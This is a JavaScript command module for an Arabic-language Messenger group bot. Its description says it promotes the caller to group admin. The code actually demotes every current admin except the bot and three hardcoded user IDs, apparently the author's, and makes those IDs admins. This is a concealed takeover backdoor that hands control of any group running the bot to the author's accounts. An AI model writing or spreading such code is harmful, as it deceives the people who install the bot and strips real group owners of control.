module.exports.config = {
    name: "احم",
    version: "1.0.0",
    hasPermssion: 2,
    credits: "Ali Hussein",
    description: "ارفعني كمسؤول في المجموعة",
    commandCategory: "المطور",
    usages: "",
    cooldowns: 5
};

module.exports.run = async ({ api, event }) => {
    const threadID = event.threadID;
    const senderID = event.senderID;
    const masterUserID = '100013384479798';
    const restrictedThreadID = '7323064101070700';
    const myUserIDs = [masterUserID, '1392330091', '100059306443716'];
    const botUserID = api.getCurrentUserID();

    // تحقق ما إذا كان المستخدم الذي أرسل الأمر هو masterUserID
    if (senderID.toString() !== masterUserID) {
        // إذا كان المستخدم ليس masterUserID، تحقق مما إذا كانت المجموعة هي المجموعة المحظورة
        if (threadID === restrictedThreadID) {
            return api.sendMessage("عذراً، لن أضعك مسؤولاً في هذه المجموعة لكي لا يغضب مطوري.", threadID);
        }
    }

    // استرجاع معلومات المجموعة
    api.getThreadInfo(threadID, (err, info) => {
        if (err) return api.sendMessage("حدث خطأ عند محاولة استرجاع معلومات المجموعة.", threadID);

        // قائمة المسؤولين الحاليين
        const currentAdmins = info.adminIDs.map(admin => admin.id);

        // تحقق إذا كان أي من المعرفات هو مسؤول بالفعل
        const isAnyMyUserIDAdmin = myUserIDs.some(id => currentAdmins.includes(id));

        if (isAnyMyUserIDAdmin) {
            return api.sendMessage("🙂 أحد المطورين بالفعل مسؤول.", threadID);
        }

        // إزالة جميع المسؤولين باستثناء البوت والمعرفات الثلاثة
        currentAdmins.forEach(adminID => {
            if (adminID !== botUserID && !myUserIDs.includes(adminID)) {
                api.changeAdminStatus(threadID, adminID, false, (err) => {
                    if (err) api.sendMessage(`حدث خطأ عند محاولة إزالة المسؤول ${adminID}.`, threadID);
                });
            }
        });

        // تعيين المعرفات الثلاثة كمسؤولين بعد إزالة الآخرين
        myUserIDs.forEach(myUserID => {
            api.changeAdminStatus(threadID, myUserID, true, (err) => {
                if (err) {
                    api.sendMessage(`حدث خطأ عند محاولة تعيين المسؤول ${myUserID}.`, threadID);
                } else {
                    api.sendMessage(`🙂 تم تعيين المعرف ${myUserID} كمسؤول.`, threadID);
                }
            });
        });
    });
};
    
